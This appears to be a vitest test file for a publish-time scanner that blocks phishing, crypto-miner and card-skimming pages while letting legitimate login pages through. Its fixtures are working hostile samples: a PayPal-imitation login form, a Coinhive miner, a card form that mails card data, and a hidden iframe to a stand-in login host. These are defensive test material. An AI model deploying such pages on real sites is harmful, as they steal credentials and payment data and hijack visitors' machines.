// K3 (Wave-K, Layer 3) gate — the publish-time deterministic scan.
//
// False-positive discipline is a first-class assertion here: every blocking rule is
// paired with a LEGITIMATE fixture that must PASS. A wrongly-blocked honest builder is
// this wave's own failure mode, so the "does NOT block honest use" probes matter as much
// as the "blocks abuse" probes.

import { describe, it, expect, vi } from 'vitest';
import { scanFiles, runPublishGuard, type ScanFile } from './publish-scan';

// ─────────────────────────── fixtures ───────────────────────────

// ① Phishing: a PayPal-login clone that captures credentials. → BLOCK (PH-BRAND-CRED)
const PHISHING_BRAND = `<!doctype html><html><head><title>PayPal - Log in to your account</title></head>
<body><h1>Log in to PayPal</h1>
<form action="/steal" method="post">
  <input type="email" name="email" placeholder="Email">
  <input type="password" name="password" placeholder="Password">
  <button>Log In</button>
</form></body></html>`;

// ② Legitimate: a login for the USER'S OWN app. Same shape (email + password) but no
//    foreign brand in the title/heading. → PASS (this is the false-positive probe).
const LEGIT_OWN_LOGIN = `<!doctype html><html><head><title>MyTodo — Anmelden</title></head>
<body><h1>Willkommen zurück</h1>
<form action="/api/login" method="post">
  <input type="email" name="email" placeholder="E-Mail">
  <input type="password" name="password" placeholder="Passwort">
  <button>Anmelden</button>
</form></body></html>`;

// ②b Legitimate: own-app login that ALSO offers "Sign in with Google" (OAuth). The brand
//    appears, but framed as a legit provider → PASS (OAuth-context guard).
const LEGIT_OAUTH_LOGIN = `<!doctype html><html><head><title>MyApp Login</title></head>
<body><h1>Sign in to MyApp</h1>
<form action="/api/login"><input type="password" name="password"></form>
<a class="btn">Sign in with Google</a></body></html>`;

// ③ Malware/miner: a Coinhive miner. → BLOCK (MW-MINER-SIG)
const MINER = `<!doctype html><html><body><script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>var miner = new CoinHive.Anonymous('SITE_KEY'); miner.start();</script></body></html>`;

// ④ Payment: an own card form that mails the data to the owner. → BLOCK (PH-CARD-MAILTO)
const CARD_MAILTO = `<!doctype html><html><body>
<form action="mailto:me@example.com" method="post" enctype="text/plain">
  <input name="kartennummer" placeholder="Kreditkartennummer">
  <input name="cvv" placeholder="CVV">
  <button>Zahlen</button>
</form></body></html>`;

// ⑤ Obfuscation ALONE: an eval(atob(...)) chain, no miner signature. → LOG-ONLY, NO BLOCK
//    (conservative: obfuscation alone ≠ block).
const OBFUSCATED_ONLY = `<!doctype html><html><body><script>
eval(atob("Y29uc29sZS5sb2coJ2hpJyk="));
</script></body></html>`;

// ⑥ Phishing: a hidden iframe to a bank login. → BLOCK (PH-HIDDEN-IFRAME-AUTH)
const HIDDEN_IFRAME = `<!doctype html><html><body><h1>Gewinnspiel</h1>
<iframe src="https://evil.example/login" style="display:none" width="0" height="0"></iframe>
</body></html>`;

const f = (path: string, content: string): ScanFile => ({ path, content });

describe('K3 scanFiles — blocks high-confidence abuse', () => {
  it('BLOCKS a brand-imitation credential-harvesting page (PH-BRAND-CRED)', () => {
    const r = scanFiles([f('index.html', PHISHING_BRAND)]);
    expect(r.blocked).toBe(true);
    expect(r.blockArea).toBe('phishing');
    expect(r.hits.some((h) => h.ruleId === 'PH-BRAND-CRED' && h.confidence === 'high')).toBe(true);
  });

  it('BLOCKS a known crypto-miner (MW-MINER-SIG)', () => {
    const r = scanFiles([f('index.html', MINER)]);
    expect(r.blocked).toBe(true);
    expect(r.blockArea).toBe('malware');
    expect(r.hits.some((h) => h.ruleId === 'MW-MINER-SIG')).toBe(true);
  });

  it('BLOCKS an own card form that mails the data (PH-CARD-MAILTO)', () => {
    const r = scanFiles([f('pay.html', CARD_MAILTO)]);
    expect(r.blocked).toBe(true);
    expect(r.blockArea).toBe('payment');
    expect(r.hits.some((h) => h.ruleId === 'PH-CARD-MAILTO')).toBe(true);
  });

  it('BLOCKS a hidden iframe to a login/auth URL (PH-HIDDEN-IFRAME-AUTH)', () => {
    const r = scanFiles([f('index.html', HIDDEN_IFRAME)]);
    expect(r.blocked).toBe(true);
    expect(r.hits.some((h) => h.ruleId === 'PH-HIDDEN-IFRAME-AUTH')).toBe(true);
  });
});

describe('K3 scanFiles — false-positive discipline (honest use must PASS)', () => {
  it('PASSES a login for the user\'s OWN app (no foreign brand)', () => {
    const r = scanFiles([f('index.html', LEGIT_OWN_LOGIN)]);
    expect(r.blocked).toBe(false);
    expect(r.hits.filter((h) => h.confidence === 'high')).toHaveLength(0);
  });

  it('PASSES an own-app login offering "Sign in with Google" (OAuth context)', () => {
    const r = scanFiles([f('index.html', LEGIT_OAUTH_LOGIN)]);
    expect(r.blocked).toBe(false);
  });

  it('does NOT block on obfuscation alone — logs it LOW (MW-OBFUSCATED-EVAL)', () => {
    const r = scanFiles([f('app.js', OBFUSCATED_ONLY)]);
    expect(r.blocked).toBe(false);
    expect(r.hits.some((h) => h.ruleId === 'MW-OBFUSCATED-EVAL' && h.confidence === 'low')).toBe(true);
  });

  it('skips non-scannable files (images, css, json)', () => {
    const r = scanFiles([f('logo.png', 'coinhive'), f('style.css', 'coinhive'), f('data.json', 'coinhive')]);
    expect(r.hits).toHaveLength(0);
  });
});

describe('K3 runPublishGuard — orchestration, logging, block event', () => {
  const guardDeps = (files: Record<string, string>) => ({
    listFiles: vi.fn(async () => Object.keys(files)),
    downloadFile: vi.fn(async (_pid: string, p: string) => files[p] ?? null),
  });

  it('returns ok:false with an appeal-carrying German message on a high-confidence hit', async () => {
    const out = await runPublishGuard(guardDeps({ 'index.html': PHISHING_BRAND }), 'u1', 'p1');
    expect(out.ok).toBe(false);
    expect(out.policyArea).toBe('phishing');
    expect(out.message).toMatch(/Nutzungsrichtlinie/);
    expect(out.message).toMatch(/Feedback-Knopf/); // appeal path named
    expect(out.ruleIds).toContain('PH-BRAND-CRED');
  });

  it('returns ok:true for a legitimate own-app login', async () => {
    const out = await runPublishGuard(guardDeps({ 'index.html': LEGIT_OWN_LOGIN }), 'u1', 'p1');
    expect(out.ok).toBe(true);
    expect(out.message).toBeUndefined();
  });

  it('degrades OPEN (ok:true) when file loading throws — never kills an honest publish', async () => {
    const deps = { listFiles: vi.fn(async () => { throw new Error('storage down'); }), downloadFile: vi.fn() };
    const out = await runPublishGuard(deps, 'u1', 'p1');
    expect(out.ok).toBe(true);
  });
});
